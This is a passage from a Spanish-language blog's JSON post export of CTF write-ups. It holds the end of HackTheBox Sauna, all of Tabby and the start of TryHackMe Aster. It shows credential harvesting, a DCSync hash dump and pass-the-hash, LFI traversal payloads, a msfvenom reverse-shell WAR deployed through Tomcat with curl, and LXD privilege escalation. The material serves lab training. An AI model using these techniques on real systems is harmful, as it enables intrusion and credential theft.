HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\\VolatileUserMgrKey *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt; Encontramos una contraseña del usuario svc_loanmanager: DefaultUserName REG_SZ EGOTISTICALBANK\\svc_loanmanager DefaultPassword REG_SZ Moneymakestheworldgoround! Los usuarios registrados en la maquina aparece svc_loanmgr como usuario, pero en el query aparece svc_loanmanager por lo que suponemos que la contraseña pertenece a svc_loanmgr: *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt; net users User accounts for \\\\ ------------------------------------------------------------------------------- Administrator FSmith Guest HSmith krbtgt svc_loanmgr The command completed with one or more errors. *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt; Utilizamos EvilWinrm con las credenciales de svc_loanmgr:\nPRIVILEGE ESCALATION Utilizamos Bloodhound.py para obtener informacion con el usuario svc_loanmgr importamos los datos a bloodhound, luego de esto utilizamos Aclpwn.py para poder encontrar una ruta para obtener privilegios de administrador de la misma forma que la maquina Forest de HackTheBox.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 root@aoiri:~/tools/BloodHound.py/sauna# python ../bloodhound -u svc_loanmgr -p \u0026#39;Moneymakestheworldgoround!\u0026#39; -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c all INFO: Found AD domain: egotistical-bank.local INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 1 computers INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL INFO: Found 6 users INFO: Connecting to GC LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL INFO: Found 51 groups INFO: Found 0 trusts INFO: Starting computer enumeration with 10 workers INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL INFO: Done in 01M 15S root@aoiri:~/tools/BloodHound.py/sauna# zip -r sauna.zip *.json updating: computers.json (deflated 75%) updating: domains.json (deflated 85%) updating: groups.json (deflated 95%) updating: users.json (deflated 92%) root@aoiri:~/tools/BloodHound.py/sauna# Bloodhound 1 2 3 4 5 6 7 root@aoiri:~/tools/aclpwn.py# python aclpwn.py -f svc_loanmgr -p \u0026#39;Moneymakestheworldgoround!\u0026#39; -ft user -t EGOTISTICAL-BANK.LOCAL -tt domain -d EGOTISTICAL-BANK.LOCAL -du neo4j -dp root -s 10.10.10.175 Please supply the password or LM:NTLM hashes of the account you are escalating from: [+] Path found! Path: (SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL)-[GetChangesAll]-\u0026gt;(EGOTISTICAL-BANK.LOCAL) [-] DCSync -\u0026gt; continue [+] Finished running tasks root@aoiri:~/tools/aclpwn.py# En la ejecucion de Aclpwn nos aparece que el usuario svc_loanmgr ya tiene permisos para ejecutar DCSync. Sabiendo esto, utilizamos secretsdump.py de impacket para obtener los hashes de los usuarios registrados en la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 root@aoiri:~/tools/impacket/examples# python secretsdump.py svc_loanmgr:\u0026#39;Moneymakestheworldgoround!\u0026#39;@10.10.10.175 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: EGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c::: SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:ba6af99033d007cdc1a1fbff2af7c4e7::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031 Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0 Administrator:des-cbc-md5:19d5f15d689b1ce5 krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24 krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9 krbtgt:des-cbc-md5:c170d5dc3edfc1d9 EGOTISTICAL-BANK.LOCAL\\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324 EGOTISTICAL-BANK.LOCAL\\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9 EGOTISTICAL-BANK.LOCAL\\HSmith:des-cbc-md5:1c73b99168d3f8c7 EGOTISTICAL-BANK.LOCAL\\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2 EGOTISTICAL-BANK.LOCAL\\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b EGOTISTICAL-BANK.LOCAL\\FSmith:des-cbc-md5:b50e02ab0d85f76b EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2 SAUNA$:aes256-cts-hmac-sha1-96:69c8e51b35b01f1a8ab165234d674ab739770549b8741e176f51a75780a8bfe2 SAUNA$:aes128-cts-hmac-sha1-96:8d7e85b92a9930e14eb79b15519775a1 SAUNA$:des-cbc-md5:fea201988a20bf46 [*] Cleaning up... Psexec.py Logramos obtener los hashes del usuario Administrator, utilizamos psexec.py con los hashes que encontramos para obtener una shell y nuestra flag root.txt.\n","description":"Sauna una maquina de HackTheBox, encontramos usuarios los cuales utilizamos para crear un wordlist personalizado y realizar ASREPRoast con Impacket lo que nos dio acceso por WinRM. Accedimos a un segundo usuario con una contraseña que encontramos en el registro de windows. Finalmente enumeramos con BloodHound y con la informacion recolectada obtuvimos acceso con ACLPwn para luego realizar Pass-the-Hash y obtener acceso privilegiado con PSExec.","id":90,"section":"posts","tags":["smbclient","evil-winrm","bloodhound","aclpwn","impacket"],"title":"Hack The Box - Sauna","uri":"https://sckull.github.io/posts/sauna/"},{"content":"\rEn Tabby descubrimos una vulnerabilidad LFI y, que con DotDotPwn logramos obtener la direccion o payload para leer documentos lo que nos llevo a leer las credenciales de Tomcat, con este ultimo logramos subir un Payload para obtener una shell inversa utilizando Curl. Crackeamos con Fcrackzip un archiv zip lo que nos dio acceso a un segundo usuario. Escalamos privilegios creando un contenedor privilegiado utilizando LXC.\nInformacion de la Maquina Nombre Tabby OS Linux Puntos 20 Dificultad Facil IP 10.10.10.194 Maker egre55\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.9, 6.5, 6.4, 3.6, 3.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 9, 9, 1, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http tomcat (8080), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 # Nmap 7.80 scan initiated Thu Sep 24 01:03:09 2020 as: nmap -p- --min-rate 1000 -o allports 10.10.10.194 Warning: 10.10.10.194 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.194 (10.10.10.194) Host is up (0.13s latency). Not shown: 64652 closed ports, 880 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8080/tcp open http-proxy # Nmap done at Thu Sep 24 01:05:44 2020 -- 1 IP address (1 host up) scanned in 154.47 seconds # Nmap 7.80 scan initiated Thu Sep 24 01:06:26 2020 as: nmap -p22,80,8080 -sC -sV -o serviceports 10.10.10.194 Nmap scan report for 10.10.10.194 (10.10.10.194) Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Sep 24 01:06:41 2020 -- 1 IP address (1 host up) scanned in 15.55 seconds HTTP Encontramos una pagina web en el puerto 80 que ofrece servicios de hosting.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 kali@kali:~/htb/tabby$ gobuster dir -u http://10.10.10.194/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /favicon.ico (Status: 200) /files (Status: 301) /index.php (Status: 200) /index.php (Status: 200) /news.php (Status: 200) /Readme.txt (Status: 200) /server-status (Status: 403) Las direcciones que encontramos no tienen algo que nos pudiera ayudar pero, al revisar el codigo fuente de la pagina principal vemos que el boton News en el nav, nos redirige hacia otra pagina con el dominio megahosting.htb el cual agregamos a nuestro archivo /etc/hosts a la IP de la maquina. Regresamos nuevamente a la pagina y vemos que la URL se le pasa un archivo (?file=statement), posiblemente tenga una vulnerabilidad de LFI.\nDOTDOTPWN - LFI Utilizamos la herramienta dotdotpwn la cual nos ayudo a identificar la vulnerabilidad LFI en la pagina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 kali@kali:~/htb/tabby$ dotdotpwn -m http-url -u http://megahosting.htb/news.php?file=TRAVERSAL -k \u0026#34;root:\u0026#34; -t .2 -q ################################################################################# # # # CubilFelino Chatsubo # # Security Research Lab and [(in)Security Dark] Labs # # chr1x.sectester.net chatsubo-labs.blogspot.com # # # # pr0udly present: # # # # ________ __ ________ __ __________ # # \\______ \\ ____ _/ |_\\______ \\ ____ _/ |_\\______ \\__ _ __ ____ # # | | \\ / _ \\\\ __\\| | \\ / _ \\\\ __\\| ___/\\ \\/ \\/ // \\ # # | ` \\( \u0026lt;_\u0026gt; )| | | ` \\( \u0026lt;_\u0026gt; )| | | | \\ /| | \\ # # /_______ / \\____/ |__| /_______ / \\____/ |__| |____| \\/\\_/ |___| / # # \\/ \\/ \\/ # # - DotDotPwn v3.0.2 - # # The Directory Traversal Fuzzer # # http://dotdotpwn.sectester.net # # dotdotpwn@sectester.net # # # # by chr1x \u0026amp; nitr0us # ################################################################################# [+] Report name: Reports/megahosting.htb_09-24-2020_01-28.txt [========== TARGET INFORMATION ==========] [+] Hostname: megahosting.htb [+] Protocol: http [+] Port: 80 [=========== TRAVERSAL ENGINE ===========] [+] Creating Traversal patterns (mix of dots and slashes) [+] Multiplying 6 times the traversal patterns (-d switch) [+] Creating the Special Traversal patterns [+] Translating (back)slashes in the filenames [+] Adapting the filenames according to the OS type detected (unix) [+] Including Special sufixes [+] Traversal Engine DONE ! - Total traversal tests created: 11028 [=========== TESTING RESULTS ============] [+] Ready to launch 5000.00 traversals per second [+] Press Enter to start the testing (You can stop it pressing Ctrl + C) [+] Replacing \u0026#34;TRAVERSAL\u0026#34; with the traversals created and sending . [*] Testing URL: http://megahosting.htb/news.php?file=../../../../etc/passwd \u0026lt;- VULNERABLE [*] Testing URL: http://megahosting.htb/news.php?file=../../../../../etc/passwd \u0026lt;- VULNERABLE [*] Testing URL: http://megahosting.htb/news.php?file=../../../../../../etc/passwd \u0026lt;- VULNERABLE . . [*] Testing URL: http://megahosting.htb/news.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd \u0026lt;- VULNERABLE [*] Testing URL: http://megahosting.htb/news.php?file=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd \u0026lt;- VULNERABLE [*] Testing URL: http://megahosting.htb/news.php?file=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd \u0026lt;- VULNERABLE . ^C [+] Total Traversals found: 6 [-] Fuzz testing aborted [+] Report saved: Reports/megahosting.htb_09-24-2020_01-28.txt Vemos la lista de usuarios que podriamos utilizar posteriormente.\nAdemás de ello logramos obtener el codigo fuente de la pagina vulnerable:\n1 2 3 4 5 6 7 8 \u0026lt;?php $file = $_GET[\u0026#39;file\u0026#39;]; $fh = fopen(\u0026#34;files/$file\u0026#34;,\u0026#34;r\u0026#34;); while ($line = fgets($fh)) { echo($line); } fclose($fh); ?\u0026gt; Realizamos una busqueda de archivos conocidos de linux por posibles contraseñas o configuraciones para ingresar pero no encontramos nada.\nHTTP - PUERTO 8080 Encontramos una pagina web en el puerto 8080 en Apache Tomcat, donde vemos un mensaje que indica que Tomcat se instalo satisfactoriamente y muestran algunas direcciones de la maquina, pero lo interesante es la nota que dejan.\nIndica que los usuarios estan \u0026ldquo;definidos\u0026rdquo; en la direccion /etc/tomcat9/tomcat-users.xml.\n1 NOTE: For security reasons, using the manager webapp is restricted to users with role \u0026#34;manager-gui\u0026#34;. The host-manager webapp is restricted to users with role \u0026#34;admin-gui\u0026#34;. Users are defined in /etc/tomcat9/tomcat-users.xml. Y tambien algunas variables que son necesarias para tomcat, como CATALINA_HOME y CATALINA_BASE:\n1 Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz. Al utilizar tal direccion en la pagina con vulnerabilidad LFI no resulto, aunque el archivo RUNNING.txt.gz es posible obtenerlo pero no de forma completa. Por lo que instalamos tomcat9 en nuestra maquina para verificar que archivos son los que se pueden encontrar en tales carpetas. Vemos que existen algunos archivos dentro de la carpeta /usr/share/tomcat9/ en los cuales al pasarlo en la pagina vulnerable podemos leerlo, incluyendo el archivo tomcat-users.xml.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 kali@kali:~/htb/tabby$ tree /usr/share/tomcat9/ /usr/share/tomcat9/ ├── bin │ ├── bootstrap.jar │ │ [... REDACTED ...] ├── default.template ├── etc │ ├── catalina.properties │ ├── context.xml │ ├── jaspic-providers.xml │ ├── logging.properties │ ├── server.xml │ ├── tomcat-users.xml │ └── web.xml ├── lib │ ├── annotations-api.jar -\u0026gt; ../../java/tomcat9-annotations-api.jar │ [... REDACTED ...] └── logrotate.template 3 directories, 48 files Encontramos un usuario y contraseña en http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml el cual tiene los roles admin-gui y manager-script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; [... REDACTED ...] \u0026lt;tomcat-users xmlns=\u0026#34;http://tomcat.apache.org/xml\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://tomcat.apache.org/xml tomcat-users.xsd\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; [... REDACTED ...] \u0026lt;role rolename=\u0026#34;admin-gui\u0026#34;/\u0026gt; \u0026lt;role rolename=\u0026#34;manager-script\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;$3cureP4s5w0rd123!\u0026#34; roles=\u0026#34;admin-gui,manager-script\u0026#34;/\u0026gt; \u0026lt;/tomcat-users\u0026gt; Intentamos ingresar con las credenciales al panel pero recordemos que en el mensaje del index indica que los usuarios con roles admin-gui no tienen acceso al panel de /manager\nIntentamos en /host-manager/html donde logramos ingresar, mas no logramos hacer nada.\nTOMCAT - USER Intentamos utilizar el exploit tomcat_mgr_upload de metasploit pero este mostraba errores ya que la pagina /manager esta \u0026ldquo;desactivada\u0026rdquo;, exploramos otras opciones y encontramos Tomcat exploit variant : host-manager pero este solo funciona en maquinas Windows. Investigamos un poco sobre como se sube estos archivos (.war) y encontramos que es posible subir estos mediante curl utilizando las credenciales y un archivo .war sin necesidad de acceder al GUI de la aplicacion.\nPara ello vamos a tener que crear un payload como en la maquina THM/BSIDESGT - THOMPSON y poner a la escucha metasploit:\n1 msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=1338 -f war \u0026gt; batman.war Y realizamos el deploy de nuestro archivo:\n1 curl --upload-file batman.war --user \u0026#39;tomcat:$3cureP4s5w0rd123!\u0026#39; \u0026#34;http://10.10.10.194:8080/manager/text/deploy?path=/batman\u0026amp;update=True\u0026#34; Ponemos a la escucha metasploit o netcat en el puerto indicado en el payload y ejecutamos nuestra \u0026ldquo;applicacion\u0026rdquo; o batman.war visitando la siguiente url:\n1 curl --user \u0026#39;tomcat:$3cureP4s5w0rd123!\u0026#39; http://10.10.10.194:8080/batman Logramos obtener una shell con usuario tomcat.\nASH - USER En el directorio /var/www/html/files encontramos un archivo zip el cual esta protegido con contraseña, utilizamos fcrackzip para obtener la contraseña y el contenido de este archivo.\n1 2 3 4 5 6 7 8 9 10 tomcat@tabby:/var/www/html/files$ ls -lah ls -lah total 36K drwxr-xr-x 4 ash ash 4.0K Jun 17 21:59 . drwxr-xr-x 4 root root 4.0K Jun 17 16:24 .. -rw-r--r-- 1 ash ash 8.6K Jun 16 13:42 16162020_backup.zip drwxr-xr-x 2 root root 4.0K Jun 16 20:13 archive drwxr-xr-x 2 root root 4.0K Jun 16 20:13 revoked_certs -rw-r--r-- 1 root root 6.4K Jun 16 11:25 statement tomcat@tabby:/var/www/html/files$ Aunque encontramos la contraseña, al descomprimir el archivo no logramos leer alguna credencial dentro de los archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 kali@kali:~/htb/tabby$ fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip PASSWORD FOUND!!!!: pw == admin@it kali@kali:~/htb/tabby$ tree var/ var/ └── www └── html ├── assets ├── favicon.ico ├── files ├── index.php ├── logo.png ├── news.php └── Readme.txt 4 directories, 5 files kali@kali:~/htb/tabby$ Utilizamos la contraseña del archivo comprimido que encontramos con el usuario ash en la maquina y logramos obtener una shell con este usuario y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con id y vemos que el usuario pertenece al grupo de lxd.\n1 2 3 4 ash@tabby:~$ id id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) ash@tabby:~$ Ya que este usuario pertenece a este grupo (lxd) vamos a escalar privilegios a traves de este al igual que en las maquinas presentadas en THM - LXD.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #LOCAL git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine -a i686 #MACHINE lxc image import ./alpine-v3.12-i686-20200924_0424.tar.gz --alias myimage lxc image list #Si no funcionan los comandos --\u0026gt; lxd init lxc init myimage sckull -c security.privileged=true lxc config device add sckull mydevice disk source=/ path=/mnt/root recursive=true lxc start sckull lxc exec sckull /bin/sh Logramos obtener una shell root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ash@tabby:~$ lxc image import ./alpine-v3.12-i686-20200924_0424.tar.gz --alias myimage \u0026lt;ine-v3.12-i686-20200924_0424.tar.gz --alias myimage If this is your first time running LXD on this machine, you should also run: lxd init To start your first instance, try: lxc launch ubuntu:18.04 ash@tabby:~$ lxc image list lxc image list +---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCHITECTURE | TYPE | SIZE | UPLOAD DATE | +---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+ | myimage | 850be888e99a | no | alpine v3.12 (20200924_04:24) | i686 | CONTAINER | 3.07MB | Sep 24, 2020 at 8:40am (UTC) | +---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+ ash@tabby:~$ lxc init myimage sckull -c security.privileged=true lxc init myimage sckull -c security.privileged=true Creating sckull ash@tabby:~$ lxc config device add sckull mydevice disk source=/ path=/mnt/root recursive=true \u0026lt;ydevice disk source=/ path=/mnt/root recursive=true Device mydevice added to sckull ash@tabby:~$ lxc start sckull lxc start sckull ash@tabby:~$ lxc exec sckull /bin/sh lxc exec sckull /bin/sh ~ # whoami whoami root Docs - Deploy War by URL ","description":"En Tabby descubrimos una vulnerabilidad LFI y, que con DotDotPwn logramos obtener la direccion o payload para leer documentos lo que nos llevo a leer las credenciales de Tomcat, con este ultimo logramos subir un Payload para obtener una shell inversa utilizando Curl. Crackeamos con Fcrackzip un archiv zip lo que nos dio acceso a un segundo usuario. Escalamos privilegios creando un contenedor privilegiado utilizando LXC.","id":91,"section":"posts","tags":["lfi","dotdotpwn","tomcat","msfvenom","fcrackzip","lxc"],"title":"Hack The Box - Tabby","uri":"https://sckull.github.io/posts/tabby/"},{"content":"\rAster es una maquina de TryHackMe, realizamos un ataque de fuerza bruta al login de Asterisk seguidamente obtuvimos credenciales que nos dieron acceso a la maquina. Un archivo JAR y enumeracion de cronjobs nos permitió leer la flag root.txt.\nRoom Titulo Aster Descripción Hack my server dedicated for building communications applications. Puntos 110 Dificultad Media Maker stuxnet NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (80), cisco-sccp (2000), asterisk (5038) y el puerto ssh (22) abiertos entre otros de los cuales no logramos obtener mucha informacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 # Nmap 7.80 scan initiated Fri Sep 25 15:53:12 2020 as: nmap -p- --min-rate 1000 -o allPorts aster.thm Warning: 10.10.105.28 giving up on port because retransmission cap hit (10). Nmap scan report for aster.thm (10.10.105.28) Host is up (0.25s latency). Not shown: 65508 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 1720/tcp open h323q931 2000/tcp open cisco-sccp 5038/tcp open unknown 8022/tcp filtered oa-system 8766/tcp filtered amcs 9765/tcp filtered unknown 12914/tcp filtered unknown 12955/tcp filtered unknown 13827/tcp filtered unknown 23734/tcp filtered unknown 24689/tcp filtered unknown 31507/tcp filtered unknown 32749/tcp filtered unknown 35841/tcp filtered unknown 36268/tcp filtered unknown 37303/tcp filtered unknown 39769/tcp filtered unknown 43235/tcp filtered unknown 45589/tcp filtered unknown 46305/tcp filtered unknown 48045/tcp filtered unknown 56150/tcp filtered unknown 60407/tcp filtered unknown 63664/tcp filtered unknown 63871/tcp filtered unknown # Nmap done at Fri Sep 25 15:55:14 2020 -- 1 IP address (1 host up) scanned in 122.08 seconds # Nmap 7.80 scan initiated Fri Sep 25 15:57:39 2020 as: nmap -p22,80,1720,2000,5038,8022,8766,9765,12914,12955,13827,23734,24689,31507,32749,35841,36268,37303,39769,43235,45589,46305,48045,56150,60407,63664,63871 -sV -sC -o servicesAllPorts aster.thm Nmap scan report for aster.thm (10.10.105.28) Host is up (0.40s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA) | 256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA) |_ 256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Aster CTF 1720/tcp open h323q931? 2000/tcp open cisco-sccp? 5038/tcp open asterisk Asterisk Call Manager 5.0.2 8022/tcp closed oa-system 8766/tcp closed amcs 9765/tcp closed unknown 12914/tcp closed unknown 12955/tcp closed unknown 13827/tcp closed unknown 23734/tcp closed unknown 24689/tcp closed unknown 31507/tcp closed unknown 32749/tcp closed unknown 35841/tcp closed unknown 36268/tcp closed unknown 37303/tcp closed unknown 39769/tcp closed unknown 43235/tcp closed unknown 45589/tcp closed unknown 46305/tcp closed unknown 48045/tcp closed unknown 56150/tcp closed unknown 60407/tcp closed unknown 63664/tcp closed unknown 63871/tcp closed unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 25 15:58:42 2020 -- 1 IP address (1 host up) scanned in 62.78 seconds HTTP Encontramos una pagina web en el puerto 80 en la que nos da un script en python.\n1 2 3 kali@kali:~/thm/aster$ file output.pyc output.pyc: python 2.7 byte-compiled kali@kali:~/thm/aster$ Utilizamos uncompyle6 para extraer el codigo fuente el cual contenia algunos mensajes codificados en hex.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 # uncompyle6 version 3.7.3 # Python bytecode 2.7 (62211) # Decompiled from: Python 3.8.2 (default, Apr 1 2020, 15:52:55) # [GCC 9.3.0] # Embedded file name: ./output.py # Compiled at: 2020-08-11 02:59:35 import pyfiglet pyfiglet_var = pyfiglet.figlet_format(\u0026#39;Hello!!\u0026#39;) oO00oOo = \u0026#39;476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e\u0026#39; OOOo0 = bytes.fromhex(oO00oOo) Oooo000o = OOOo0.decode(\u0026#39;ASCII\u0026#39;) if 0: i1 * ii1IiI1i % OOooOOo / I11i / o0O / IiiIII111iI Oo = \u0026#39;476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21\u0026#39; I1Ii11I1Ii1i = bytes.fromhex(Oo) Ooo = I1Ii11I1Ii1i.decode(\u0026#39;ASCII\u0026#39;) if 0: iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II print pyfiglet_var # okay decompiling output.pyc Vemos en uno de los mensajes el usuario admin y que esta instalado algun software de comunicacion en el servidor.\n1 2 3 476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e: Good job, user \u0026#34;admin\u0026#34; the open source framework for building communications, installed in the server. 476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21: Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool! GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos pero no encontramos más que solo los archivos estaticos de la pagina.\n1 2 3 4 5 6 kali@kali:~/thm/aster$ gobuster dir -u http://aster.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 